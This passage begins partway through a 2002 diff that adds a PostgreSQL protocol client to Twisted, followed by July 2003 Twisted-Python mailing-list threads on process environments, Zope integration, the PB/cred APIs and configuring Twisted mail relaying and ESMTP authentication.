+            print self.prefix, 'Got 100 rows'
+
+    def queryDone(self):
+        print self.prefix, 'Done (%d rows)' % self.count
+        self.done = 1
+
+pf = postgresql.PostgreSQLClientFactory('sune')
+pool = spock.ConnectionPool('localhost', 5432, pf)
+
+for i in range(8):
+    sql = 'SELECT * FROM foo WHERE id=%d' % i
+    consumer = Consumer('%d' % i)
+    pool.query(sql, consumer)
+
+main.run()
diff --exclude-from=diffignore -Naur Twisted-0.12.3/twisted/protocols/postgresql.py Twisted/twisted/protocols/postgresql.py
--- Twisted-0.12.3/twisted/protocols/postgresql.py	Thu Jan  1 01:00:00 1970
+++ Twisted/twisted/protocols/postgresql.py	Wed Jan  2 13:54:53 2002
@@ -0,0 +1,336 @@
+from socket import htons, htonl, ntohs, ntohl
+import struct
+import string
+import array
+
+from twisted.protocols import protocol
+
+class IncompletePacket:
+    pass
+
+def parseBytes(l, s):
+    if len(s) < l:
+        raise IncompletePacket()
+    return s[0:l], s[l:]
+
+def formatInt16(i):
+    return struct.pack('h', htons(i))
+
+def parseInt16(s):
+    l = struct.calcsize('h')
+    if len(s) < l:
+        raise IncompletePacket()
+    return ntohs(struct.unpack('h', s[0:l])[0]), s[l:]
+
+def formatInt32(i):
+    return struct.pack('i', htonl(i))
+
+def parseInt32(s):
+    l = struct.calcsize('i')
+    if len(s) < l:
+        raise IncompletePacket()
+    return ntohl(struct.unpack('i', s[0:l])[0]), s[l:]
+
+def formatLimString(l, s):
+    if len(s) < l:
+        return s + '\0' * (l - len(s))
+    else:
+        return s[0:l]
+
+def formatString(s):
+    return s + '\0'
+
+def parseString(s):
+    l = string.find(s, '\0')
+    if l < 0:
+        raise IncompletePacket
+    return s[0:l], s[l + 1:]
+
+
+class StartupPacket:
+    def __init__(self, user, database='', args='', tty=''):
+        self.user = user
+        self.database = database
+        self.args = args
+        self.tty = tty
+    def send(self, transport):
+        s  = formatInt32(296)         # packet length
+        s += formatInt16(2)           # protocol version, major
+        s += formatInt16(0)           # protocol version, minor
+        s += formatLimString(64, self.database)
+        s += formatLimString(32, self.user)
+        s += formatLimString(64, self.args)
+        s += formatLimString(64, '')  # unused
+        s += formatLimString(64, self.tty)
+        transport.write(s)
+
+class TerminatePacket:
+    def send(self, transport):
+        transport.write('X')
+
+class QueryPacket:
+    def __init__(self, query):
+        self.query = query
+
+    def send(self, transport):
+        transport.write('Q' + formatString(self.query))
+
+class CursorResponsePacket:
+    def __init__(self, name):
+        self.name = name
+
+class EmptyQueryResponsePacket:
+    pass
+
+class CompletedResponsePacket:
+    def __init__(self, cmd):
+        self.command = cmd
+
+class AuthenticationPacket:
+    def __init__(self, auth):
+        self.authentication = auth
+
+class BackendKeyDataPacket:
+    def __init__(self, pid, key):
+        self.process_id = pid
+        self.key = key
+
+class ReadyForQueryPacket:
+    pass
+
+class RowDescriptionPacket:
+    def __init__(self, columns):
+        self.columns = columns
+
+class AsciiRowPacket:
+    def __init__(self, columns):
+        self.columns = columns
+
+class ErrorPacket:
+    def __init__(self, message):
+        self.message = message
+
+class UnknownPacket(Exception):
+    pass
+
+
+def parsePacket(client, data):
+    orig_data = data
+    tag, data = parseBytes(1, data)
+
+    try:
+        if tag == 'E':
+            error, data = parseString(data)
+            return ErrorPacket(error), data
+
+        if tag == 'R':
+            auth, data = parseInt32(data)
+            return AuthenticationPacket(auth), data
+
+        if tag == 'K':
+            pid, data = parseInt32(data)
+            key, data = parseInt32(data)
+            return BackendKeyDataPacket(pid, key), data
+
+        if tag == 'Z':
+            return ReadyForQueryPacket(), data
+
+        if tag == 'P':
+            name, data = parseString(data)
+            return CursorResponsePacket(name), data
+
+        if tag == 'I':
+            unused, data = parseString(data)
+            return EmptyQueryResponsePacket(), data
+
+        if tag == 'T':
+            count, data = parseInt16(data)
+            columns = []
+            for i in range(count):
+                name, data = parseString(data)
+                type_oid, data = parseInt32(data)
+                type_size, data = parseInt16(data)
+                type_modifier, data = parseInt32(data)
+                columns.append((name, (type_oid, type_size, type_modifier)))
+            return RowDescriptionPacket(tuple(columns)), data
+
+        if tag == 'D':
+            field_count = len(client.row_description)
+            if field_count % 8 == 0:
+                bytes = field_count / 8
+            else:
+                bytes = field_count / 8 + 1
+            bitmap, data = parseBytes(bytes, data)
+            bitmap = array.array('B', bitmap)
+
+            fields = []
+            mask = 1 << 8
+            for i in range(field_count):
+                mask = mask >> 1
+                if mask == 0:
+                    mask = 1 << 7
+                    del bitmap[0]
+
+                if not bitmap[0] & mask:
+                    fields.append(None)
+
+                else:
+                    size, data = parseInt32(data)
+                    value, data = parseBytes(size - 4, data)
+                    fields.append(value)
+
+            return AsciiRowPacket(fields), data
+
+        if tag == 'C':
+            cmd, data = parseString(data)
+            return CompletedResponsePacket(cmd), data
+
+    except IncompletePacket:
+        return None, orig_data
+
+    raise UnknownPacket(orig_data)
+        
+
+class SilentObserver:
+    def connectionMade(self, client):
+        pass
+
+    def backendError(self, client, message):
+        pass
+
+    def protocolError(self, client, message):
+        pass
+
+    def readyForQuery(self, client):
+        pass
+
+    def connectionLost(self, client):
+        pass
+
+class SilentConsumer:
+    def __init__(self):
+        self.done = 0
+        self.types = None
+
+    def receivedHead(self, types):
+        assert self.types is None
+        self.types = types
+        
+    def receivedRow(self, data):
+        assert not self.types is None
+        assert len(self.types) == len(data)
+        assert not self.done
+
+    def queryDone(self):
+        self.done = 1
+
+class PostgreSQLClientFactory(protocol.ClientFactory):
+    def __init__(self, user, password='', args='', tty=''):
+        self.args = (user, password, args, tty)
+
+    def __getstate__(self):
+        return self.args
+    def __setstate__(self, state):
+        self.args = state
+        
+    def buildProtocol(self, conn):
+        p = apply(PostgreSQLClient, self.args)
+        p.factory = self
+        return p
+
+class PostgreSQLClient(protocol.Protocol):
+    def __init__(self, user, password='', args='', tty=''):
+        self.user = user
+        self.password = password
+        self.backend_args = args
+        self.backend_tty = tty
+
+        self.ready = 0
+        self.buffer = ''
+        self.row_description = None
+
+        self.observer = SilentObserver()
+        self.consumer = SilentConsumer()
+
+    def setObserver(self, ob):
+        if ob is None:
+            ob = SilentObserver()
+        self.observer = ob
+
+    def connectionMade(self):
+        self.ready = 1
+        self.sendPacket(StartupPacket(self.user))
+
+    def query(self, query, consumer=SilentConsumer()):
+        self.consumer = consumer
+        self.sendPacket(QueryPacket(query))
+
+    def terminate(self):
+        self.sendPacket(TerminatePacket())
+        self.transport.loseConnection()
+        self.observer.terminated(self)
+
+    def sendPacket(self, p):
+        if not self.ready:
+            raise 'Not ready for query.'
+
+        self.ready = 0
+        p.send(self.transport)
+
+    def dataReceived(self, data):
+        self.buffer = self.buffer + data
+        while len(self.buffer) > 0:
+            try:
+                packet, self.buffer = parsePacket(self, self.buffer)
+                
+                if packet is None:
+                    break
+
+                type = packet.__class__
+                if type is AuthenticationPacket:
+                    if packet.authentication == 0:
+                        self.observer.connectionMade(self)
+                    else:
+                        s = 'Got request for unsupported ' + \
+                            'authentication: %d' % packet.authentication
+                        self.observer.protocolError(self, s)
+                        self.terminate()
+
+                elif type is BackendKeyDataPacket:
+                    self.backend_key = packet
+
+                elif type is ReadyForQueryPacket:
+                    self.ready = 1
+                    self.consumer.queryDone()
+                    if self.ready:
+                        self.observer.readyForQuery(self)
+
+                elif type is RowDescriptionPacket:
+                    self.row_description = packet.columns
+                    self.consumer.receivedHead(self.row_description)
+                
+                elif type is ErrorPacket:
+                    self.observer.backendError(self, packet.message)
+                    self.consumer = SilentConsumer()
+
+                elif type is CursorResponsePacket:
+                    pass
+
+                elif type is AsciiRowPacket:
+                    self.consumer.receivedRow(packet.columns)
+
+                elif type is CompletedResponsePacket:
+                    pass
+
+                else:
+                    s = 'Got a "%s" I do not know what to do with!' % \
+                        packet.__class__.__name__
+                    self.observer.protocolError(self, s)
+
+            except UnknownPacket, e:
+                s = 'Unknown packet: %s' % `e.args[0]`
+                self.observer.protocolError(self, s)
+                self.terminate()
+                self.buffer = ''
+
+__all__ = ['PostgreSQLClient']

From justinjohnson at fastmail.fm  Mon Jul 28 11:10:31 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Mon, 28 Jul 2003 09:10:31 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725185121.1B75133420@www.fastmail.fm>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
  	<20030725173934.617B237D19@www.fastmail.fm> <20030725140020.6f507950.itamar@itamarst.org> <20030725185121.1B75133420@www.fastmail.fm>
Message-ID: <20030728151031.7D46836324@www.fastmail.fm>

Another interesting problem...

The command I am trying to run using my subclass of ProcessProtocol is a
commercial product that needs to get a license from a license server,
plus it needs to talk to another server to get data.  So it needs to open
a socket to the license server and a different during my invocation of
the command.  When I run the command using the attached code, I get a
message saying it can't contact the license server, even though the
command works just fine on the command-line, outside of python/twisted. 
Is there a valid reason my process can't communicate out, or is this
possibly a bug with the win32eventreactor?  Attached is the file I'm
running, and the output I get is below.


cmd: cleartool.exe
args: ['lsvob', '-s']
stdout:
stderr: cleartool: Error: Unknown host 'rat00001': [WINSOCK] Host not
found
cleartool: Error: Cannot contact license server host "rat00001".
cleartool: Error: You do not have a license to run ClearCase.

status: 0
failure: [Failure instance: Traceback:
twisted.internet.error.ProcessTerminated
 process ended with exit code 1
]
*--- Failure #5 ---
--- <exception caught here> ---
*--- End of Failure #5 ---

-------------- next part --------------
A non-text attachment was scrubbed...
Name: my.py
Type: application/unknown
Size: 1463 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030728/4542098d/attachment.bin 

From bob at redivi.com  Mon Jul 28 11:48:29 2003
From: bob at redivi.com (Bob Ippolito)
Date: Mon, 28 Jul 2003 11:48:29 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030728151031.7D46836324@www.fastmail.fm>
Message-ID: <EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com>

On Monday, Jul 28, 2003, at 11:10 America/New_York, Justin Johnson 
wrote:

> Another interesting problem...
>
> The command I am trying to run using my subclass of ProcessProtocol is 
> a
> commercial product that needs to get a license from a license server,
> plus it needs to talk to another server to get data.  So it needs to 
> open
> a socket to the license server and a different during my invocation of
> the command.  When I run the command using the attached code, I get a
> message saying it can't contact the license server, even though the
> command works just fine on the command-line, outside of python/twisted.
> Is there a valid reason my process can't communicate out, or is this
> possibly a bug with the win32eventreactor?  Attached is the file I'm
> running, and the output I get is below.

Is there some chance that clearcase depends on some environment 
variables or something that aren't being inherited by the executed 
process?

-bob




From itamar at itamarst.org  Mon Jul 28 11:57:18 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 28 Jul 2003 11:57:18 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com>
References: <20030728151031.7D46836324@www.fastmail.fm>
	<EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com>
Message-ID: <20030728115718.3bcc3972.itamar@itamarst.org>

On Mon, 28 Jul 2003 11:48:29 -0400
Bob Ippolito <bob at redivi.com> wrote:

> Is there some chance that clearcase depends on some environment 
> variables or something that aren't being inherited by the executed 
> process?

To expand on what Bob said, you may indeed want to pass os.environ as
the env arg of spawnProcess.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From justinjohnson at fastmail.fm  Mon Jul 28 12:11:34 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Mon, 28 Jul 2003 10:11:34 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030728115718.3bcc3972.itamar@itamarst.org>
References: <20030728151031.7D46836324@www.fastmail.fm>
 	<EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com> <20030728115718.3bcc3972.itamar@itamarst.org>
Message-ID: <20030728161134.9591437C16@www.fastmail.fm>

That did the trick.  Thank you!

On Mon, 28 Jul 2003 11:57:18 -0400, "Itamar Shtull-Trauring"
<itamar at itamarst.org> said:
> On Mon, 28 Jul 2003 11:48:29 -0400
> Bob Ippolito <bob at redivi.com> wrote:
> 
> > Is there some chance that clearcase depends on some environment 
> > variables or something that aren't being inherited by the executed 
> > process?
> 
> To expand on what Bob said, you may indeed want to pass os.environ as
> the env arg of spawnProcess.
> 
> -- 
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From pje at telecommunity.com  Mon Jul 28 13:25:54 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Mon, 28 Jul 2003 13:25:54 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <3F254097.4040407@zope.com>
References: <3F2404F6.1010501@modernsongs.com>
 <1059322398.26800.23.camel@anthem>
 <3F2404F6.1010501@modernsongs.com>
Message-ID: <5.1.0.14.0.20030728131951.01e61890@mail.telecommunity.com>

At 11:26 AM 7/28/03 -0400, Shane Hathaway wrote:
>Gary Poster wrote:
>>As to the request parsing, I like Twisted's design a lot.  My impression 
>>is that if you used it, rather than Zope's request parsing, you would be 
>>in for a lot more work, but that work would probably end up being a big 
>>eventual win in clarity and simplicity.  If I were doing it, I'd punt and 
>>stick with Zope's, with a regretful glance backward.  If you have the gas 
>>to go up the mountain, though, I betcha the view's worth it. :-)
>
>May I suggest a different approach?
>
>Zope 3's HTTP request parsing is superior to Twisted's because it can more 
>easily handle complex features of HTTP like pipelining.  However, 
>Twisted's core is a better-executed implementation of the same idea behind 
>asyncore.  Therefore, this is how I'd like to see the integration work:
>
>- Enhance Twisted's HTTP server with notions taken from Zope 3's HTTP 
>server.  The most important notion is that there is a request object that 
>does nothing but receive the request data.  Once the entire request is 
>received, the request is used to construct an HTTP transaction; at that 
>time the request is considered immutable.  Also, the generic memory/disk 
>buffer concept could be a big win for Twisted.
>
>- Rename Zope 3's HTTPTask to HTTPTransaction.  Create 
>IHTTPTransaction.  (It might become part of Twisted instead of Zope.)
>
>- Add only specific modules of Twisted to the Zope 3 source, such as 
>twisted.internet (I think that's its name).  Straighten out the licensing 
>first.

And there's yet another possible approach...  Have Zope depend on specific 
I*Reactor interfaces in place of asyncore, but don't necessarily depend on 
Twisted itself.  I'm not sure if this meets the intended goals for 
Zope/Twisted integration, but it's a useful first step.  If this is useful, 
PEAK has an "UntwistedReactor" class that implements a useful subset of the 
Twisted reactor interfaces, enough to be able to have a select loop and 
scheduled callbacks.  It's ZPL/PSF licensed, so you can steal it fair and 
square.  So, as long as the existing Zope 3 server code just expects to be 
woken up by asyncore for reads and writes, it should be pretty adaptable to 
the reactor interface, at which point it could be hooked into Twisted or 
into a Zope 3 mini-reactor.




From pobrien at orbtech.com  Mon Jul 28 13:53:25 2003
From: pobrien at orbtech.com (Patrick K. O'Brien)
Date: 28 Jul 2003 12:53:25 -0500
Subject: [Twisted-Python] New PB connection API
In-Reply-To: <20030725155001.69d11afc.itamar@itamarst.org>
References: <20030725155001.69d11afc.itamar@itamarst.org>
Message-ID: <m2adayzgfe.fsf@orbtech.com>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:

> First sketch is in CVS. Please comment if you have any issues with it,
> I'd like to refactor old APIs to use new API next.

I just converted several apps to use your new api.  It was pretty
painless.  I'm not sure what benefit I got out of it, but since it was
painless I'll assume it was worthwhile and will let you clean things
up in the core.

Related to this, I'm gearing up to covert my existing apps to use new
cred, instead of old cred, and I'm not clear how perspectives fit into
the new cred world-view.  Based on your new pb API, can I assume
perspectives still have a place with PB apps?

Even my woven apps are using guard.PerspectiveWrapper/SessionWrapper,
which gets a Resource object from the Perspective instance that I
retrieve when the user logs in.  Is this a completely deprecated
approach, or not?

-- 
Patrick K. O'Brien
Orbtech      http://www.orbtech.com/web/pobrien
-----------------------------------------------
"Your source for Python programming expertise."
-----------------------------------------------




From gary at zope.com  Mon Jul 28 14:20:57 2003
From: gary at zope.com (Gary Poster)
Date: Mon, 28 Jul 2003 14:20:57 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <3F254097.4040407@zope.com>
References: <1059322398.26800.23.camel@anthem> <3F2404F6.1010501@modernsongs.com> <3F254097.4040407@zope.com>
Message-ID: <3F256989.4020108@zope.com>


Shane Hathaway wrote:
> Gary Poster wrote:
>> ...
> May I suggest a different approach?
 > ...
But of course. ;-)  FWIW, this is exactly what I meant by "a lot more 
work" (except that you know more about it than I :-).  Yes, I'd love to 
see this happen if you're up for it, Butch.

 > Straighten out the licensing first.

Oh yeah, forgot about that.  I've seen several discussions of the 
licensing on the Twisted list... Maybe Phil Eby's implementation is the 
only way out of that one.

Gary




From itamar at itamarst.org  Mon Jul 28 14:35:58 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 28 Jul 2003 14:35:58 -0400
Subject: [Twisted-Python] New PB connection API
In-Reply-To: <m2adayzgfe.fsf@orbtech.com>
References: <20030725155001.69d11afc.itamar@itamarst.org>
	<m2adayzgfe.fsf@orbtech.com>
Message-ID: <20030728143558.5b0f14b4.itamar@itamarst.org>

On 28 Jul 2003 12:53:25 -0500
pobrien at orbtech.com (Patrick K. O'Brien) wrote:

> I just converted several apps to use your new api.  It was pretty
> painless.  I'm not sure what benefit I got out of it, but since it was
> painless I'll assume it was worthwhile and will let you clean things
> up in the core.

1. You can subclass PBClientFactory and thus get, say, automatic
reconnection.
2. You can connectSSL rather than connectTCP, etc..
3. Unix sockets are no longer implemented using an evil hack.

> Related to this, I'm gearing up to covert my existing apps to use new
> cred, instead of old cred, and I'm not clear how perspectives fit into
> the new cred world-view.  Based on your new pb API, can I assume
> perspectives still have a place with PB apps?

Eventually PB will switch to new cred. This depends on some improvements
to PB tthat we are still working out. It *may* happen before 1.1 but I'm
guessing it won't :(

> Even my woven apps are using guard.PerspectiveWrapper/SessionWrapper,
> which gets a Resource object from the Perspective instance that I
> retrieve when the user logs in.  Is this a completely deprecated
> approach, or not?

Yes. But as long as you're using PB with same Perspectives you may need
to still use it.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From warner at lothar.com  Mon Jul 28 14:50:22 2003
From: warner at lothar.com (Brian Warner)
Date: Mon, 28 Jul 2003 11:50:22 -0700 (PDT)
Subject: [Twisted-Python] Inheriting Environment (was: Wrapping
 blocking code)
References: <20030728151031.7D46836324@www.fastmail.fm>
 <EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com>
 <20030728115718.3bcc3972.itamar@itamarst.org>
Message-ID: <20030728.115022.109875724.warner@lothar.com>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:
> 
> To expand on what Bob said, you may indeed want to pass os.environ as
> the env arg of spawnProcess.

We've talked about this briefly before, but perhaps this should be the
default? I think that "child inherits the environment of the parent" is the
most commonly expected behavior; that's why environment variables are not
the same as command-line arguments. Programs which change context somehow
(setuid) should clear their environment before spawning a process, but in
general the child is running with the same permissions as the parent, and I
think it is appropriate for them to operate in the same environment.

I've got a patch to implement this around here somewhere..

 -Brian



From Martin.Moellenbeck at t-online.de  Mon Jul 28 14:51:00 2003
From: Martin.Moellenbeck at t-online.de (=?iso-8859-1?Q?Martin_M=F6llenbeck?=)
Date: Mon, 28 Jul 2003 20:51:00 +0200
Subject: AW: [Twisted-Python] New PB connection API
In-Reply-To: <20030728143558.5b0f14b4.itamar@itamarst.org>
Message-ID: <000f01c35539$30247ba0$0200a8c0@joshua>

hi,

is there an roadmap to release 1.1?

Martin

> -----Urspr?ngliche Nachricht-----
> Von: twisted-python-admin at twistedmatrix.com 
> [mailto:twisted-python-admin at twistedmatrix.com] Im Auftrag 
> von Itamar Shtull-Trauring
> Gesendet: Montag, 28. Juli 2003 20:36
> An: twisted-python at twistedmatrix.com
> Betreff: Re: [Twisted-Python] New PB connection API
> 
> 
> On 28 Jul 2003 12:53:25 -0500
> pobrien at orbtech.com (Patrick K. O'Brien) wrote:
> 
> > I just converted several apps to use your new api.  It was pretty 
> > painless.  I'm not sure what benefit I got out of it, but 
> since it was 
> > painless I'll assume it was worthwhile and will let you 
> clean things 
> > up in the core.
> 
> 1. You can subclass PBClientFactory and thus get, say, 
> automatic reconnection. 2. You can connectSSL rather than 
> connectTCP, etc.. 3. Unix sockets are no longer implemented 
> using an evil hack.
> 
> > Related to this, I'm gearing up to covert my existing apps 
> to use new 
> > cred, instead of old cred, and I'm not clear how 
> perspectives fit into 
> > the new cred world-view.  Based on your new pb API, can I assume 
> > perspectives still have a place with PB apps?
> 
> Eventually PB will switch to new cred. This depends on some 
> improvements to PB tthat we are still working out. It *may* 
> happen before 1.1 but I'm guessing it won't :(
> 
> > Even my woven apps are using 
> guard.PerspectiveWrapper/SessionWrapper,
> > which gets a Resource object from the Perspective instance that I 
> > retrieve when the user logs in.  Is this a completely deprecated 
> > approach, or not?
> 
> Yes. But as long as you're using PB with same Perspectives 
> you may need to still use it.
> 
> -- 
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com 
> http://twistedmatrix.com/cgi-> bin/mailman/listinfo/twisted-python
> 




From pje at telecommunity.com  Mon Jul 28 15:35:31 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Mon, 28 Jul 2003 15:35:31 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <3F256E81.6030802@zope.com>
References: <5.1.0.14.0.20030728131951.01e61890@mail.telecommunity.com>
 <3F254097.4040407@zope.com>
 <5.1.0.14.0.20030728131951.01e61890@mail.telecommunity.com>
Message-ID: <5.1.0.14.0.20030728152540.01e52a60@mail.telecommunity.com>

At 02:42 PM 7/28/03 -0400, Shane Hathaway wrote:
>Phillip J. Eby wrote:
>>And there's yet another possible approach...  Have Zope depend on 
>>specific I*Reactor interfaces in place of asyncore, but don't necessarily 
>>depend on Twisted itself.  I'm not sure if this meets the intended goals 
>>for Zope/Twisted integration, but it's a useful first step.  If this is 
>>useful, PEAK has an "UntwistedReactor" class that implements a useful 
>>subset of the Twisted reactor interfaces, enough to be able to have a 
>>select loop and scheduled callbacks.  It's ZPL/PSF licensed, so you can 
>>steal it fair and square.  So, as long as the existing Zope 3 server code 
>>just expects to be woken up by asyncore for reads and writes, it should 
>>be pretty adaptable to the reactor interface, at which point it could be 
>>hooked into Twisted or into a Zope 3 mini-reactor.
>
>That sounds great.  Do you have a ViewCVS link?

Interface is at:

http://cvs.eby-sarna.com/PEAK/src/peak/running/interfaces.py?rev=HEAD&content-type=text/vnd.viewcvs-markup

See 'IBasicReactor'.

For the implementation, see:

http://cvs.eby-sarna.com/PEAK/src/peak/running/scheduler.py?rev=HEAD&content-type=text/vnd.viewcvs-markup

It's class 'UntwistedReactor'.  The implementation depends on peak.binding, 
but not in any deep way.  You should be able to replace most of the 
'binding.bindSomehow' attributes with an __init__ method.  The class also 
expects to have a 'logger' attribute that's a PEP 282-compatible 
logger.  Last, but not least, you can interpret the 'self._delBinding()' 
calls as meaning that the specified attribute should be reinitialized.

You can pretty much ignore the rest of the module for your purposes, except 
the _Appt class, which is a private class representing a scheduled callback.


>The one feature that we'd need beyond the simple "wake me up when 
>something is ready" interface is the trigger interface.  It lets a thread 
>tell the main thread to wake up immediately.

Ah.  I didn't implement that, as I haven't needed it for anything.  I 
believe you can emulate it over the primitives I've supplied, though, as I 
believe Twisted normally does it by setting up some kind of pipe or socket 
that the thread writes to, with a reader hooked up on the reactor.  The 
reader just throws away the meaningless data, but of course the main thread 
has now been reawakened from its select() call.




From twisted at goldenspud.com  Mon Jul 28 17:26:17 2003
From: twisted at goldenspud.com (Matthew R. Scott)
Date: Mon, 28 Jul 2003 16:26:17 -0500
Subject: [Twisted-Python] questions about Twisted mail
Message-ID: <200307281626.17865.twisted@goldenspud.com>

Hello Twisted hackers extraordinaire!

I am evaluating the use of Twisted mail for small- to medium-sized
installations.  My goal is to get up and running with it fairly soon, with
only minor changes in the areas of email account database / authentication.

As I've been evaluating it, I have come up with a few questions regarding
 best practices for its use.

First, I'll give some background on how I am evaluating it.

Disclaimer: I know my way around "talking SMTP and POP3" on a basic level
(telnetting to a host and going through a session manually) but I am not too
familiar with the ins and outs of "talking ESMTP AUTH" yet. :)

Software
========

Mozilla 1.5a
Kmail 1.5.2
Twisted CVS 2003-07-28

Goals
=====

Ultimately, I want Twisted mail to support these outcomes from common e-mail
scenarios:

POP3 access to account: PASS
SMTP Mail from outside domain to outside domain: FAIL
SMTP Mail from outside domain to user: PASS
SMTP Mail from user to user: PASS
SMTP Mail from user to outside domain: FAIL
ESMTP Mail from user to user: PASS
ESMTP Mail from user to outside domain: PASS

mktap variations
================

I've run through several 'mktap mail' variations and these are the results
I've gathered.

In all cases, there is a 'queue' and 'test.example.com' directory in the
directory where mail.tap is created and started from.  'twistd -nof mail.tap'
is the command line used to start the mail server.

Also, when doing regular SMTP sessions, I am sending the following commands
 in a session with the SMTP server to try to send mail:

  HELO localhost
  MAIL FROM:<from at email.address>
  RCPT TO:<to at email.address>
  DATA
  testing 1 2 3
  .

(!) indicates passing when it should be failing, or failing when it should be
passing

mktap mail --maildirdbmdomain=test.example.com=test.example.com --esmtp
--user=test=1234 --default

POP3 access to account: PASS
SMTP Mail from outside domain to outside domain: PASS (!)
SMTP Mail from outside domain to user: PASS
SMTP Mail from user to user: PASS
SMTP Mail from user to outside domain: PASS (!)
ESMTP Mail from user to user: FAIL (!)
ESMTP Mail from user to outside domain: FAIL (!)

mktap mail --maildirdbmdomain=test.example.com=test.example.com --esmtp
--user=test=1234 --default --disable-anonymous

POP3 access to account: PASS
SMTP Mail from outside domain to outside domain: FAIL
SMTP Mail from outside domain to user: FAIL (!)
SMTP Mail from user to user: FAIL (!)
SMTP Mail from user to outside domain: FAIL
ESMTP Mail from user to user: FAIL (!)
ESMTP Mail from user to outside domain: FAIL (!)

Failure details for ESMTP
=========================

When I configured Mozilla's SMTP settings, it did not give me an option to
specify what kind of authentication to perform; it only allowed me to specify
whether or not a username and password were required.

This is what was in the twistd log when I tried sending using Mozilla in the
second mktap variation:

2003/07/28 16:11 CDT [twisted.mail.protocols.ESMTPFactory] Connection from
('127.0.0.1', 33291)
2003/07/28 16:11 CDT [ESMTP,0,127.0.0.1] Failure:
twisted.cred.error.UnhandledCredentials: No checker for
twisted.cred.credentials.IAnonymous ,twisted.cred.credentials.ICredentials
2003/07/28 16:11 CDT [ESMTP,0,127.0.0.1]
/home/gldnspud/p/PYTHONPATH/twisted/protocols/smtp.py:553:
exceptions.DeprecationWarning: Returning None from validateFrom is
deprecated.  Raise smtp.SMTPBadSender instead

Interestingly, in the first mktap variation, Mozilla was able to send mail
just fine, which makes me wonder if it is even using ESMTP AUTH.

When using Kmail to send mail via both variations, it complains with an
"authentication failed" message.  This was after setting the authentication
type to CRAM-MD5 and verifying that the correct username "test" was in place.
The log file from twistd shows the following:

2003/07/28 16:13 CDT [twisted.mail.protocols.ESMTPFactory] Connection from
('127.0.0.1', 33293)
2003/07/28 16:13 CDT [ESMTP,1,127.0.0.1] Failure:
twisted.cred.error.UnhandledCredentials: No checker for
twisted.cred.credentials.IUsernameHashedPassword
,twisted.cred.credentials.ICredentials


Questions
=========

Some more questions, to which I'll post my own answers if I find them out
after tinkering some more:

Are any of the problems I'm running into (such as the "No checker for
...IUsernameHashedPassword" failure) due to the transitional nature of
Twisted CVS?   (I freely admit I have not yet tried any of the above on the
last "stable" Twisted release)

Would it be easy (or at least feasible) to implement ESMTP "AUTH PLAIN" in
Twisted's SMTP server?  (I'm assuming so, since "AUTH CRAM-MD5" is already
implemented)

How close is IMAP server capability to being integrated with Twisted mail?

How would one keep usernames on different domains separate in terms of
 logging in with POP3 and authenticating with ESMTP?  E.g. "jdoe at domain1.com"
 and "jdoe at domain2.com"

What are some common configurations of Twisted mail that are currently
deployed in production environments?


Thanks,

--
Matthew R. Scott
OMAjA / http://www.omaja.com/




From andrew-twisted at puzzling.org  Mon Jul 28 04:37:33 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Mon, 28 Jul 2003 18:37:33 +1000
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <20030726234818.46192.qmail@web80606.mail.yahoo.com>
References: <20030726234818.46192.qmail@web80606.mail.yahoo.com>
Message-ID: <20030728083733.GA21243@frobozz>

On Sat, Jul 26, 2003 at 04:48:18PM -0700, Butch Landingin wrote:
> Hi all,
> 
> I've been mucking about with Zope3 and twisted, trying to get Zope3 to 
> run under twisted's reactor framework. I'm still at code-spiking stage 
[...]
> 
> Some of the issues so far: 
>     
[...]
>        
>      2. Configuration: zope's configuration machinery (i.e. ZConfig) or twisted's 
>         configuration machinery (e.g. coil)? Which is better? Or maybe can I use 
>         both? Or maybe a way for the two to work together?

Twisted's COIL is currently old and not very functional.  Work is underway
to rewrite it properly (thanks Donovan!), but seeing as that isn't done yet,
the pragmatic answer would have to be ZConfig.

> PS. I cross-posted to both the zope3-dev and twisted-python lists
> so if you're listed on both, sorry.

Hey, I'm interested in both (and especially in them working together), so I
can't complain! :)

-Andrew.




From vng1 at mac.com  Mon Jul 28 20:11:46 2003
From: vng1 at mac.com (Victor Ng)
Date: Mon, 28 Jul 2003 20:11:46 -0400
Subject: [Twisted-Python] How do I make a Twisted server 'look' like it's synchronous?
In-Reply-To: <20030712181337.16477.qmail@green.zadka.com>
Message-ID: <3E29A8B4-C159-11D7-9E45-00039373D624@mac.com>

I'm pretty confused with how to write an XMLRPC method that runs for a 
long time.  For example - I have an XMLRPC call that will do a database 
fetch.

